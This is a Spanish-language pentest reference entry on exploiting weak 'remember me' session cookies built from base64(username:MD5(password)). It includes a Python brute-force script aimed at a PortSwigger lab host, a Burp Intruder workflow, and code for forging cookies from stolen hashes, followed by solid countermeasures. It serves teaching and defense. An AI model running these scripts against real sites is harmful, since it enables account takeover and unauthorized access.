---
title: Explotación de Cookies de Sesión Débiles
slug: explotacion-session-cookies-debiles
aliases: [Cookies de Sesión Débiles, weak session cookie, predictable session token, remember-me cookie attack, stay-logged-in cookie, persistent auth cookie, cookie brute force, session token forgery, hash-as-token, derived auth cookie, cookie exfiltration via XSS, offline password cracking from cookie, MD5 password hash leak]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1539, T1110.001]
related: [explotacion-jwt, explotacion-brute-force-advanced]
learning_refs: [portswigger/brute-forcing-stay-logged-in-cookie, portswigger/offline-password-cracking]
---

# Explotación de Cookies de Sesión Débiles

## Descripción
Las aplicaciones web frecuentemente implementan cookies persistentes ("remember me", "stay logged in") cuya validez es **verificable client-side**: el servidor recibe la cookie, la decodifica/firma localmente y autentica sin consultar un store server-side. Cuando el contenido de esa cookie es derivable de las credenciales (típicamente `base64(username:hash(password))` o variantes con cifrado simétrico) y el hash usado es rápido o sin sal, la cookie se vuelve un primitive de "ofrecé el hash y entrá": un atacante con una wordlist de candidatos hashea offline cada uno, arma la cookie correspondiente, y la prueba contra un endpoint autenticado hasta que una pase. Como la cookie sortea por completo el endpoint `/login`, también sortea su rate-limit, lockout y captcha. La técnica se aplica también a session tokens de baja entropía (predictable session IDs, secuenciales, derivados de timestamp) donde la enumeración o predicción reemplaza el hashing offline.

## Herramientas
- **Burp Suite Intruder** (Sniper attack con payload processing rules en cadena: `Hash MD5 → Add prefix → Base64 encode`) — herramienta canónica del workflow de PortSwigger; aplica transforms a la wordlist y dispara cada candidato como cookie.
- **Burp Suite Sequencer** — analiza calidad de aleatoriedad de session tokens con tests estadísticos (FIPS 140-2). Detecta tokens predictables o de baja entropía antes de intentar brute-force.
- **`hashcat`** (`-m 0` MD5, `-m 100` SHA-1, `-m 3200` bcrypt) — para escenarios offline donde se obtuvo el hash plano y se quiere recuperar el password antes de armar cookies. Velocidad MD5 ~10⁹ h/s en GPU mediana.
- **`hashlib` + `base64` de Python** — script ad-hoc para iterar wordlists y armar cookies cuando el formato es simple. Más rápido de iterar que Burp para variantes.
- **CookieMonster** ([github.com/iangcarroll/cookiemonster](https://github.com/iangcarroll/cookiemonster)) — detecta y rompe cookies firmadas con secrets débiles (Flask, Express, Django, Rails). Identifica el framework y prueba secrets comunes.
- **`flask-unsign`** — específico para Flask session cookies firmadas con secret HMAC débil; integrable con wordlists de secrets.

## Comandos / Ejemplos

### Análisis manual del formato de la cookie (interpretación binaria)
```bash
# Decodificar base64 plano
echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
# wiener:51dc30ddc473d43a6011e9ebba6ca770
#  ^^^^^^^^^^^^^ esto es md5("peter") = formato confirmado
```

### Brute-force online de cookie derivada (Python ad-hoc)
```python
# Por cada pwd: armar cookie esperada y probar contra endpoint autenticado
import base64, hashlib, requests

target = "carlos"
host = "lab.web-security-academy.net"
for pwd in open("candidate-passwords.txt").read().splitlines():
    md5 = hashlib.md5(pwd.encode()).hexdigest()
    cookie = base64.b64encode(f"{target}:{md5}".encode()).decode()
    r = requests.get(f"https://{host}/my-account?id={target}",
                     cookies={"stay-logged-in": cookie})
    if "Update email" in r.text:  # marker de estado autenticado
        print(f"FOUND {target}:{pwd} | cookie={cookie}")
        break
```

### Workflow Burp Intruder (Sniper sobre cookie con payload processing)
```
1. Capturar GET /my-account?id=carlos en el proxy.
2. Send to Intruder. Position § alrededor del valor de la cookie stay-logged-in.
3. Payloads: Simple list = candidate-passwords.
4. Payload Processing (en orden, todos chequeados):
     - Hash: MD5
     - Add prefix: "carlos:"
     - Encode: Base64-encode
5. Settings > Grep — Match: "Update email" (marca responses autenticados).
6. Start attack. La fila con el match marcado es el password correcto.
```

### Detección de session tokens débiles con Burp Sequencer
```
1. Tools > Sequencer > Live capture
2. Marcar el endpoint que emite session tokens (típicamente /login response Set-Cookie).
3. Capturar 200+ tokens.
4. Analyze. FIPS 140-2 tests miden entropía bit a bit. Score <80 bits efectivos = brute-forceable; <40 bits = predictable.
```

### Forjar cookie con hash robado (post-DB-leak)
```python
# Si se obtuvo el hash desde una breach (SQLi, backup leak), no hace falta crackear
# el password — el hash directo basta para armar la cookie y autenticarse.
import base64
hash_robado = "5f4dcc3b5aa765d61d8327deb882cf99"  # md5 obtenido de DB
cookie = base64.b64encode(f"victim:{hash_robado}".encode()).decode()
# usar 'cookie' como stay-logged-in para autenticarse como 'victim'
```

## Contramedidas
- **Reemplazar cookies derivadas por opaque session tokens**: 32 bytes random (`secrets.token_urlsafe(32)`), almacenados server-side con metadata (expiración, IP, user-agent, revocation flag). El cliente lleva una clave de búsqueda, no estado.
- **Si por arquitectura la cookie debe ser stateless**, firmarla con HMAC-SHA256 usando un secret server-side fuerte (≥256 bits, no derivable, rotable). Verifica integridad sin permitir forjar.
- **Hashing de passwords con algoritmo lento + salt único**: bcrypt (cost ≥12), Argon2id (m=64MB, t=3, p=4), o scrypt. Nunca MD5/SHA-1/SHA-256 plano para passwords. Rotar el cost factor periódicamente.
- **Atributos de cookie obligatorios**: `Secure` (HTTPS only), `HttpOnly` (no accesible vía JS), `SameSite=Lax` o `Strict`. Sin estos, hasta un opaque token bien diseñado se filtra por XSS o CSRF.
- **Revocación server-side**: el server invalida cualquier token al instante. Logout debe purgar del store. Cambio de password debe revocar TODAS las sesiones activas del usuario.
- **Detección de uso anómalo**: mismo token desde IPs/geos drásticamente distintas, user-agents inconsistentes → forzar re-login. Indicio típico de robo de cookie por XSS o malware.
- **Limit de sesiones concurrentes per-user**: evict de las más antiguas tras N (5-10 dispositivos). Reduce el blast radius de un token comprometido.
- **MFA para acciones sensibles** (cambiar password, datos privados, transacciones), aunque la sesión persistente esté activa. "Remember me" autentica para acciones rutinarias; las críticas requieren factor adicional.

## Referencias
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 7 (Attacking Session Management).
- Hoffman, A. (2020). *Web Application Security*. O'Reilly Media. Cap. 9 (Session Management) y Cap. 10 (Authentication and Authorization).
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing. Cap. 9 (Bypassing Web Application Defenses).
- OWASP Foundation. (s.f.). *Session Management Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP Foundation. (s.f.). *Password Storage Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- OWASP Foundation. (s.f.). *Authentication Cheat Sheet — Remember-Me Function*. https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- MITRE Corporation. (2024). *ATT&CK Technique T1539: Steal Web Session Cookie*. https://attack.mitre.org/techniques/T1539/
- MITRE Corporation. (2024). *ATT&CK Technique T1110.001: Brute Force: Password Guessing*. https://attack.mitre.org/techniques/T1110/001/
- MITRE Corporation. (2024). *CWE-836: Use of Password Hash Instead of Password for Authentication*. https://cwe.mitre.org/data/definitions/836.html
- MITRE Corporation. (2024). *CWE-916: Use of Password Hash With Insufficient Computational Effort*. https://cwe.mitre.org/data/definitions/916.html
- MITRE Corporation. (2024). *CWE-759: Use of a One-Way Hash without a Salt*. https://cwe.mitre.org/data/definitions/759.html
- MITRE Corporation. (2024). *CWE-330: Use of Insufficiently Random Values*. https://cwe.mitre.org/data/definitions/330.html — aplicable a session tokens predictables.
- Carroll, I. (s.f.). *CookieMonster* [Software]. GitHub. https://github.com/iangcarroll/cookiemonster
